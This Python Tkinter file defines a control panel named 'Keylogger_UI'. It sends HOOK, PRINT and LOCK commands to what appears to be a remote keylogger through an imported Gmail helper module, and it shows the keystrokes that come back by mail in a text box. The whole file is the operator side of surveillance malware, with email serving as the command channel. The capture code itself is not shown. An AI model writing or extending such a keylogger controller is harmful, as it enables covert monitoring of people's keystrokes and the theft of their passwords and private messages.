import tkinter as tk
from tkinter import Canvas, Text, Button, PhotoImage
import gmail as g

BUFSIZE = 1024

import os
import sys
def abs_path(file_name):
    file_name = 'assets\\' + file_name
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, file_name)

def hook(btn):
    g.send_mail("HOOK")
    if btn['text'] == "HOOK":
        btn.configure(text = "UNHOOK")
    else:
        btn.configure(text = "HOOK")
    return
    
def _print( textbox):
    g.send_mail("PRINT")
    while True:
        letter = g.read_mail()
        if letter != "no":
            cmd, data = g.split_messages(letter)
            if cmd == "key_print":
                print("key_print:", data)
                textbox.config(state = "normal")
                textbox.insert(tk.END, data)
                textbox.config(state = "disable")
                return
    
        
def delete(textbox):
    textbox.config(state = "normal")
    textbox.delete("1.0", "end")
    textbox.config(state = "disable")
    return

def lock(btn):
    g.send_mail("LOCK")
    if btn['text'] == "LOCK":
        btn.configure(text = "UNLOCK")
    else:
        btn.configure(text = "LOCK")
    return

def back():
    return

class Keylogger_UI(Canvas):
     def __init__(self, parent):    
        Canvas.__init__(self, parent)
        self.configure(
            #window,
            bg = "#adeff2",
            height = 600,
            width = 1000,
            bd = 0,
            highlightthickness = 0,
            relief = "ridge"
        )

        self.place(x = 0, y = 0)
        self.image_image_1 = PhotoImage(
            file=abs_path("bg.png"))
        self.image_1 = self.create_image(
            519.0,
            327.0,
            image=self.image_image_1
        )
        self.text_1 = Text(
            self, height = 200, width = 500, state = "disable", wrap = "char",
            bd=0,
            bg='white',
            highlightthickness=0
        )
        self.text_1.place(
            x=53.0,
            y=162.0,
            width=713.0,
            height=404.0
        )
        self.button_2 = Button(self, text = 'HOOK', width = 20, height = 5, fg = 'white', bg = '#ad4b50',
            #image=button_image_2,
            borderwidth=0,
            highlightthickness=0,
            command=lambda: hook(self.button_2),
            relief="flat"
        )
        self.button_2.place(
            x=838.0,
            y=152.0,
            width=135.0,
            height=53.0
        )
        self.button_3 = Button(self, text = 'PRINT', width = 20, height = 5, fg = 'white', bg = '#ad4b50',
            #image=button_image_3,
            borderwidth=0,
            highlightthickness=0,
            command=lambda: _print(self.text_1),
            relief="flat"
        )
        self.button_3.place(
            x=838.0,
            y=238.0,
            width=135.0,
            height=53.0
        )
        self.button_4 = Button(self, text = 'DELETE', width = 20, height = 5, fg = 'white', bg = '#ad4b50',
            #image=button_image_4,
            borderwidth=0,
            highlightthickness=0,
            command=lambda: delete(self.text_1),
            relief="flat"
        )
        self.button_4.place(
            x=838.0,
            y=317.0,
            width=135.0,
            height=53.0
        )
        self.button_5 = Button(self, text = 'LOCK', width = 20, height = 5, fg = 'white', bg = '#ad4b50',
            #image=button_image_5,
            borderwidth=0,
            highlightthickness=0,
            command=lambda: lock(self.button_5),
            relief="flat"
        )
        self.button_5.place(
            x=839.0,
            y=396.0,
            width=135.0,
            height=53.0
        )
        self.button_6 = Button(self, text = 'BACK', width = 20, height = 5, fg = 'white', bg = '#ad4b50',
            #image=button_image_6,
            borderwidth=0,
            highlightthickness=0,
            command=lambda: back(),
            relief="flat"
        )
        self.button_6.place(
            x=838.0,
            y=473.0,
            width=135.0,
            height=53.0
        )
    